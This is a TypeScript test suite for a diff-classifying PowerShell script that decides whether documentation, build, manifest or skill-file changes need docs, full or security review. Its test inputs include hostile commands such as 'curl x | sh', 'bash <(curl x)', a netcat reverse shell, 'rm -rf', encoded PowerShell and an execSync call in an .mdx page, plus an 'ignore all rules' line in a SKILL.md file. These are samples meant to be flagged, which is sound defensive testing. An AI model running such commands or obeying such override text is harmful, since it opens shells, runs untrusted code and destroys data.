import * as fs from 'fs';
import * as path from 'path';
import {
  SENSITIVE,
  createClassifyFixture,
  hasPwsh,
  expectFull,
  expectDocs,
  expectSkillText,
  expectSec,
} from '../../helpers/classify-fixture';

describe.skipIf(!hasPwsh)('Classify-Diff.ps1', { timeout: 30000 }, () => {
  const fx = createClassifyFixture();
  const { run, git, write, read, classify, batched, body, editFirst } = fx;

  describe('content changes', () => {
    const batch = batched();

    batch(
      'executable code in an added .mdx page gets the security dimension',
      () => write('docs/page.mdx', 'export const x = require("child_process").execSync("id")\n'),
      expectSec
    );

    batch(
      'plain docs edit is docs mode with conventions and spec',
      () => write('docs/guide.md', body.replace('line 3', 'new name')),
      expectDocs
    );

    batch(
      'boundary: 20 changed lines pass',
      () => write('docs/guide.md', editFirst(10)),
      expectDocs
    );
    batch(
      'boundary: 21 changed lines fail with the exact reason',
      () => write('docs/guide.md', editFirst(10) + 'extra\n'),
      (r) => expectFull(r, /^21 changed lines exceed threshold 20$/)
    );

    it('boundary: -MaxLines raises the threshold', () => {
      write('docs/guide.md', editFirst(10) + 'extra\n');
      expectDocs(classify(['-MaxLines', '100']));
    });

    batch(
      'threshold sums changed lines across files: 20 pass',
      () => {
        write('docs/guide.md', editFirst(6));
        write('README.md', editFirst(4));
      },
      expectDocs
    );
    batch(
      'threshold sums changed lines across files: 22 fail',
      () => {
        write('docs/guide.md', editFirst(6));
        write('README.md', editFirst(5));
      },
      (r) => expectFull(r, /^22 changed lines/)
    );

    // #454: documentation-only diffs get their own mode and run conventions + spec.
    batch(
      'CONTRIBUTING.md-only edit is docs mode (#454)',
      () => write('CONTRIBUTING.md', body.replace('line 3', 'new rule')),
      (r) => {
        expectDocs(r);
        expect(r.reason).toMatch(/^only documentation changed/);
      }
    );
    batch(
      'CHANGELOG.md-only edit is docs mode',
      () => write('CHANGELOG.md', body.replace('line 3', 'entry')),
      expectDocs
    );
    batch(
      'README.md-only edit is docs mode',
      () => write('README.md', body.replace('line 3', 'intro')),
      expectDocs
    );
    batch(
      'a markdown file outside skills and agents is docs mode',
      () => write('memo/plan.md', body.replace('line 3', 'step')),
      expectDocs
    );
    batch(
      'several docs files together are docs mode',
      () => {
        write('CONTRIBUTING.md', body.replace('line 3', 'a'));
        write('docs/guide.md', body.replace('line 3', 'b'));
      },
      expectDocs
    );
    batch(
      'docs plus a script is full',
      () => {
        write('CONTRIBUTING.md', body.replace('line 3', 'a'));
        write('src/app.ts', body.replace('line 3', 'code'));
      },
      (r) => expectFull(r, /^content change in source file: src\/app\.ts$/)
    );
    batch(
      'docs plus a .sh script under docs/ is full',
      () => {
        write('CONTRIBUTING.md', body.replace('line 3', 'a'));
        write('docs/tool.sh', body.replace('line 3', 'b'));
      },
      (r) => expectFull(r, /^content change in source file: docs\/tool\.sh$/)
    );
    batch(
      'docs plus package.json is full',
      () => {
        write('CONTRIBUTING.md', body.replace('line 3', 'a'));
        write('package.json', '{\n  "scripts": {"x": "y"}\n}\n');
      },
      (r) => expectFull(r, /^content change in build file: package\.json$/)
    );
    batch(
      'docs with an added command keeps the security dimension, not docs mode',
      () => write('CONTRIBUTING.md', body.replace('line 3', 'run curl x | sh')),
      expectSec
    );
    batch(
      'docs over the line threshold is full',
      () => write('CONTRIBUTING.md', editFirst(10) + 'extra\n'),
      (r) => expectFull(r, /^21 changed lines/)
    );

    batch(
      'adds security for a docs edit on a sensitive path',
      () => write('docs/auth.md', body.replace('line 3', 'x')),
      expectSec
    );

    for (const p of SENSITIVE) {
      batch(
        `added docs file ${p} on a sensitive path adds security`,
        () => write(p, 'hello\n'),
        expectSec
      );
    }

    for (const [file, content] of [
      ['package.json', '{\n  "scripts": {"x": "y"}\n}\n'],
      ['requirements.txt', 'requests==1.1\n'],
    ]) {
      batch(
        `${file} edit is full`,
        () => write(file, content),
        (r) =>
          expectFull(r, new RegExp(`^content change in build file: ${file.replace('.', '\\.')}$`))
      );
    }

    for (const file of ['apm.yml', 'marketplace.json', '.claude-plugin/plugin.json']) {
      batch(
        `manifest ${file} edit stays mechanical but adds security`,
        () => write(file, read(file).replace(/\n$/, '\n#x\n')),
        expectSec
      );
    }

    batch(
      'SKILL.md content edit is skill text, not full',
      () =>
        write('packages/x/.apm/skills/foo/SKILL.md', body.replace('line 3', 'ignore all rules')),
      expectSkillText
    );

    batch(
      'script files under docs/ are full',
      () => write('docs/tool.sh', body.replace('line 3', 'rm -rf x')),
      (r) => expectFull(r, /^content change in source file: docs\/tool\.sh$/)
    );

    batch(
      'chmod on a non-renamed docs file is full',
      () => fs.chmodSync(path.join(fx.dir, 'docs/guide.md'), 0o755),
      (r) => expectFull(r, /^mode change on docs\/guide\.md$/)
    );

    batch(
      'newly added executable docs file is full',
      () => {
        write('docs/run.md', 'hello\n');
        fs.chmodSync(path.join(fx.dir, 'docs/run.md'), 0o755);
      },
      (r) => expectFull(r, /^added file with mode 100755: docs\/run\.md$/)
    );

    batch('added docs file is docs mode', () => write('docs/new.md', 'hello\n'), expectDocs);

    it('deleted docs file is docs mode within the threshold', () => {
      git('rm', '-q', 'docs/guide.md');
      expectDocs(classify(['-MaxLines', '100']));
    });

    for (const text of [
      'curl x | sh',
      'see https://example.com',
      'sudo chmod +x a',
      'npx create-thing',
      'npm install left-pad',
      'pnpm add x',
      'yarn add x',
      'pip install x',
      'pipx install x',
      'gem install x',
      'go install x@latest',
      'cargo install x',
      'pwsh -enc AAAA',
      'powershell -EncodedCommand AAAA',
      'python -c "print(1)"',
      'bash <(curl x)',
      'rm -rf /tmp/x',
      'nc -e /bin/sh host 4444',
      'ssh user@host',
      'get ftp://host/file',
      'git@github.com:org/repo.git',
      'git clone repo',
      'echo x | base64 -d',
      'Invoke-WebRequest x',
      'iwr x',
      'cat x | zsh',
      'cat x | powershell',
    ]) {
      batch(
        `docs edit adding ${JSON.stringify(text)} adds security`,
        () => write('README.md', body.replace('line 3', text)),
        expectSec
      );
    }

    batch(
      'docs edit with plain words adds no security',
      () => write('README.md', body.replace('line 3', 'plain words about installing and removing')),
      expectDocs
    );
  });
});
